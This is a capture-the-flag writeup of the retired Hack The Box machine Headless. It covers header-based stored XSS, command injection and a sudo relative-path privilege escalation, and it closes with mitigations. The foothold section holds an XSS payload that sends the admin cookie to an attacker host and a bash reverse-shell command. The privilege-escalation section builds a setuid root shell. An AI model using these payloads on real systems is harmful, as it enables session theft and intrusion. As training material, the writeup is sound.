---
machine: Headless
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, xss, cookie, command-injection, relative-path, privesc]
---

# Headless — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `headless.htb` site has a contact form that reflects HTML and warns that request headers are forwarded for analysis. An XSS payload placed in a header (`User-Agent`) runs in the administrator's browser and steals the `is_admin` cookie. That cookie opens the dashboard, whose diagnostic form has command injection and returns a shell as `dvir`. For root, `dvir` can run a `syscheck` script with `sudo`, and the script calls `./initdb.sh` through a relative path; a custom `initdb.sh` is placed in the working directory and runs as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,5000 <IP>
```

- `22` OpenSSH 9.2p1 Debian 2+deb12u2.
- `5000` an HTTP service nmap labels `upnp?`; it is the web application.
- The site is served as `headless.htb`; it is added to `/etc/hosts`.

```bash
feroxbuster -u http://headless.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The home page, the contact form and the dashboard appear; the dashboard redirects to login without an admin session.

## Enumeration

The contact form sends an email and shows a notice: when HTML tags are included, the server replies that the request headers have been forwarded for analysis. That message indicates the `User-Agent` and other headers are stored and displayed to the administrator.

The reflection is tested with a simple tag and the value is confirmed to be interpreted. The dashboard is only reachable with the admin cookie, so the goal is to steal it.

## Foothold

A local server is started and the form is submitted with a `User-Agent` that loads a script:

```http
User-Agent: <script>fetch('http://<LHOST>/?c='+document.cookie)</script>
```

When the administrator reviews the inquiry, the script runs and the request arrives with the cookie. The cookie is reused in the browser or with `curl`:

```bash
curl -s http://headless.htb/dashboard -H "Cookie: <COOKIE>"
```

The dashboard has a form that checks the status of a host or service. The parameter is passed unsanitized to a system call, so a command separator executes anything:

```text
<IP>; id
<IP>; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

The shell is `dvir`'s.

## Lateral movement

There is no second host. `dvir` has a small home and an `app` directory with the site code. Enumeration focuses on permissions and on scripts run with privileges.

## Privilege escalation

`sudo -l` shows `dvir` may run `/usr/bin/syscheck` as root. The script checks it runs as root, verifies whether the database service is active and, if not, calls `./initdb.sh` through a relative path. The binary does not change directory, so it looks for the script in the current working directory.

An `initdb.sh` is created in `/dev/shm` copying `bash`, making it root-owned and setuid, and `syscheck` is run from that directory:

```bash
cd /dev/shm
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchown root:root /tmp/rootbash\nchmod 6777 /tmp/rootbash\n' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
/tmp/rootbash -p
```

Because the script is interpreted with root privileges, the `bash` copy is setuid and returns an effective root shell.

## Evidence

- Form notice about header forwarding.
- Request received with the administrator cookie.
- Dashboard access with that cookie.
- `id` execution and reverse shell as `dvir`.
- `sudo -l` showing `/usr/bin/syscheck`.
- Custom `initdb.sh` executed and `id` with UID 0.

## Lessons learned

- HTTP headers are user input and must be escaped when displayed.
- Stealing an admin cookie can be worth more than an initial RCE.
- A diagnostic form calling the shell is direct command injection.
- A relative path in a privileged script allows hijacking the executed binary.
- `sudo` on a script is unsafe if the script depends on the current directory.

## Mitigations and detection

- Escape every reflected header and field; use autoescaping templates.
- Mark session cookies `HttpOnly`, `Secure` and `SameSite`.
- Never pass user input to `system`, `exec` or `popen`; use APIs and allowlists.
- Use absolute paths in privileged scripts and validate ownership and permissions.
- Avoid `sudo` on scripts that read files from the current directory.
- Alert on requests carrying command separators and on web processes spawning shells.

## References

- [0xdf — Headless](https://0xdf.gitlab.io/2024/07/20/htb-headless.html)
- [IppSec — Headless](https://www.youtube.com/watch?v=FDCpJbS1OuQ)
- [Hack The Box — Headless](https://app.hackthebox.com/machines/headless)
- [Knowledge — Stored XSS and admin cookie](../../../knowledge/web/stored-xss-admin-cookie.en.md)
